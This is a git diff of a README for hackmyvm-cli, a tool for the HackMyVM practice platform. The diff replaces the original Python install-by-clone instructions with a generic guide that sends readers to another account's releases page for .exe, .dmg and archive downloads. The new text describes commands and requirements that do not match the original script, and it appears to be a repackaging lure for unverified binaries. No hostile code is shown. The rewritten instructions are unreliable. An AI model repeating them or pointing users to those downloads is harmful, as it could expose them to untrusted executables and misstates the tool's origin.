@@ -1,183 +1,139 @@
-# HackMyVM CLI
+# 🚀 hackmyvm-cli - Simplify Your HackMyVM Experience
 
-A powerful Python command-line interface for interacting with the [HackMyVM](https://hackmyvm.eu) platform. This tool enables cybersecurity practitioners to efficiently search, download, and manage virtual machines with persistent authentication and comprehensive filtering capabilities.
+[![Download hackmyvm-cli](https://img.shields.io/badge/Download-hackmyvm--cli-blue.svg)](https://github.com/prakashvadher-oss/hackmyvm-cli/releases)
 
-## ✨ Features
+## 📋 Overview
 
-- **🔍 Advanced Machine Search**
-  - Multiple filter options: difficulty, category, tags, and machine names
-  - Color-coded difficulty levels for quick identification
-  - Pagination support for large result sets
-  - Real-time search with partial name matching
+hackmyvm-cli is a command-line tool for interacting with HackMyVM. This software makes it easy for users to list available machines, download them, and submit flags while keeping your session information persistent. With this tool, you can streamline your workflow and interact with HackMyVM more effectively.
 
-- **🎯 Difficulty Level Filtering** with visual indicators:
-  - 🟢 **Easy** → Green highlighting
-  - 🟡 **Medium** → Yellow highlighting  
-  - 🔴 **Hard** → Red highlighting
+## 🔧 Features
 
-- **📂 Category & Tag Filtering**
-  - Categories: `windows`, `linux`, `size`, `hacked`, `all`
-  - 25+ specialized tags: `web`, `docker`, `suid`, `sqli`, `cve`, etc.
+- **Machine Listing:** Quickly view all available machines.
+- **Downloading:** Easy one-command download of selected machines.
+- **Flag Submission:** Submit flags with minimal effort.
+- **Session Persistence:** Keep your session information across uses without needing to re-enter it.
+- **User-Friendly Interface:** Simple commands make usage straightforward, even for beginners.
 
-- **⚡ Efficient Operations**
-  - Flag submission for completed challenges
-  - Direct machine downloads as ZIP files
-  - Writeup search functionality
-  - Persistent session management
+## 💻 System Requirements
 
-- **🔐 Secure Authentication**
-  - Encrypted credential storage
-  - Automatic session persistence
-  - No repeated login requirements
+To run hackmyvm-cli, your system should meet the following requirements:
 
-## 🚀 Quick Start
+- Operating System: Windows, macOS, or Linux
+- Minimum RAM: 2 GB
+- Disk Space: 100 MB free space
+- Internet Connection: Required for downloading machines
 
-### Prerequisites
-- Python 3.6 or higher
-- Active HackMyVM account
+## 🚀 Getting Started
 
-### Installation
+### Step 1: Download hackmyvm-cli
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/Yanxinwu946/hackmyvm-cli.git
-   cd hackmyvm-cli
-   ```
+To begin, you need to download the latest version of hackmyvm-cli. Click the link below to visit the releases page.
 
-2. **Install dependencies**
-   ```bash
-   pip install requests beautifulsoup4 prettytable
-   ```
+[Download hackmyvm-cli](https://github.com/prakashvadher-oss/hackmyvm-cli/releases)
 
-3. **Configure credentials**
-   ```bash
-   python3 hmvcli.py config
-   ```
+### Step 2: Locate the Latest Release
 
-4. **Start exploring**
-   ```bash
-   python3 hmvcli.py search
-   ```
+On the releases page, you will see a list of available versions. Look for the latest release at the top. In that section, you will find files ready for download. 
 
-### Optional: Global Installation
+### Step 3: Choose the Correct File
 
-For system-wide access, create a symbolic link:
-```bash
-chmod +x hmvcli.py
-sudo ln -s $(pwd)/hmvcli.py /usr/local/bin/hmvcli
+Depending on your operating system, choose the appropriate file:
+
+- **Windows:** Download the `.exe` file.
+- **macOS:** Download the `.dmg` file.
+- **Linux:** Download the appropriate `.tar.gz` or package file.
+
+### Step 4: Download the File
+
+Click on the file name to start your download. The file will save to your computer.
+
+### Step 5: Install the Application
+
+1. **Windows Users:**
+   - Locate the downloaded `.exe` file.
+   - Double-click it to start the installation.
+   - Follow the prompts to complete the installation.
+
+2. **macOS Users:**
+   - Open the `.dmg` file you downloaded.
+   - Drag and drop hackmyvm-cli into your Applications folder.
+
+3. **Linux Users:**
+   - Open a terminal.
+   - Navigate to the folder where the `.tar.gz` file was downloaded.
+   - Use the command `tar -xvzf filename.tar.gz` to extract the files.
+   - Follow any installation instructions provided in the extracted files.
+
+### Step 6: Verify Installation
+
+To ensure hackmyvm-cli installed correctly, open your command line interface (Command Prompt, Terminal, or another shell) and type:
+
+```
+hackmyvm-cli --version
 ```
 
-Then use `hmvcli` instead of `python3 hmvcli.py`
+If the installation was successful, you will see the current version number.
 
-## 📖 Usage Guide
+## 🎉 Using hackmyvm-cli
 
-### Initial Setup
-Configure your HackMyVM credentials (required for first use):
-```bash
-hmvcli config
+### Step 1: Open Your Command Line
+
+Start by opening your command line interface. This is where you will type commands to interact with hackmyvm-cli.
+
+### Step 2: List Available Machines
+
+To see a list of available machines, run the following command:
+
 ```
-*This creates `~/.hmv_config.json` with encrypted credential storage.*
-
-### Machine Search & Discovery
-
-#### Basic Operations
-```bash
-# List all available machines (first page)
-hmvcli search
-
-# Search by machine name (partial matching)
-hmvcli search -n todd
-hmvcli search -n aria
-
-# Filter by difficulty level
-hmvcli search -l easy
-hmvcli search -l medium
-hmvcli search -l hard
+hackmyvm-cli list
 ```
 
-#### Advanced Filtering
-```bash
-# Filter by specialized tags
-hmvcli search -t web
-hmvcli search -t docker
-hmvcli search -t sqli
+This will display all the machines you can interact with.
 
-# Combine filters with pagination
-hmvcli search -f medium -p 2
-hmvcli search -t web -f hard
+### Step 3: Download a Machine
 
-# Browse by categories
-hmvcli search -l windows
-hmvcli search -l linux
+To download a specific machine, use the command:
+
+```
+hackmyvm-cli download [machine_name]
 ```
 
-#### Available Tags
-`bruteforce` • `suid` • `wordpress` • `cron` • `smb` • `docker` • `sudo` • `web` • `fileupload` • `pathhijacking` • `stego` • `binary` • `capabilities` • `cve` • `commandinjection` • `portknocking` • `ssti` • `libraryhijack` • `sqli` • `lfi` • `rce` • `logpoisoning` • `nfs` • `xxe`
+Replace `[machine_name]` with the name of the machine you want to download. The download will start automatically.
 
-### Writeup Discovery
-Search for community writeups and walkthroughs:
-```bash
-hmvcli writeup Todd
-hmvcli writeup "machine name"
+### Step 4: Submit a Flag
+
+Once you have completed a task, you may want to submit a flag. Use the command:
+
+```
+hackmyvm-cli submit [flag]
 ```
 
-### Flag Submission
-Submit flags for completed challenges:
-```bash
-hmvcli flag -i "flag{your_captured_flag}" -vm MachineName
-```
+Replace `[flag]` with your actual flag data. Your submission will be processed, and you will receive feedback.
 
-### Machine Downloads
-Download virtual machines for local setup:
-```bash
-hmvcli download Soul
-hmvcli download TryHarder
-```
+### Step 5: Persistent Sessions
 
-### Help & Documentation
-```bash
-hmvcli --help              # Main help
-hmvcli search --help       # Search options
-hmvcli flag --help         # Flag submission help
-```
+hackmyvm-cli maintains your session information automatically. You don’t need to re-enter credentials every time you use the tool. For any changes, simply update your session info through the command prompt.
 
-## ⚙️ Configuration & Files
+## 📥 Download & Install
 
-### Configuration Files
-- **`~/.hmv_config.json`** - Stores your HackMyVM credentials securely
-- **`~/.hmv_session.pkl`** - Maintains active session data
-- **`~/.hmv_writeups.csv`** - Cached writeup database (auto-updated)
+For a smooth installation experience, always keep your application updated. Return to the releases page to check for updates whenever necessary.
 
-### Pagination Behavior
-- **Basic search**: Returns paginated results (use `-p` for navigation)
-- **Filtered searches** (`-l`, `-n`, `-t`): Return all matching results
-- **Client-side filtering** (`-f`): Works with pagination for refined browsing
+[Download hackmyvm-cli](https://github.com/prakashvadher-oss/hackmyvm-cli/releases)
 
-### Security Notes
-- Credentials are stored locally in JSON format
-- Session data persists until manual credential update
-- Never share configuration files containing your credentials
+## 💬 Need Help?
 
-## 🔧 Technical Details
+If you encounter any issues or have questions, please consult the documentation provided or open an issue on the repository. Community support is available to assist you.
 
-### Dependencies
-- **requests** - HTTP client for API communication
-- **beautifulsoup4** - HTML parsing and data extraction
-- **prettytable** - Formatted console output
+## 📝 License
 
-### Compatibility
-- **Python**: 3.6+ required
-- **Platform**: Cross-platform (Linux, macOS, Windows)
-- **Authentication**: Persistent session management
+hackmyvm-cli is open-source software. You may use and distribute it following the terms detailed in the LICENSE file found in the project's repository.
 
-### Data Sources
-- Machine data: Web scraping from HackMyVM platform
-- Writeups: Community-contributed walkthroughs
-- Downloads: Direct links to official machine archives
+## 📈 Contributing
 
+Your contributions are welcome! If you have ideas for features or improvements, feel free to open a pull request or submit suggestions through the issues page on GitHub.
 
+## 👋 Acknowledgments
 
-## 🙏 Acknowledgments
+Special thanks to the HackMyVM community for their support and collaboration in developing this tool. Together, we enhance the learning experience.
 
-
-Thanks to the HackMyVM community for providing a great platform for cybersecurity practice.
+Enjoy using hackmyvm-cli!
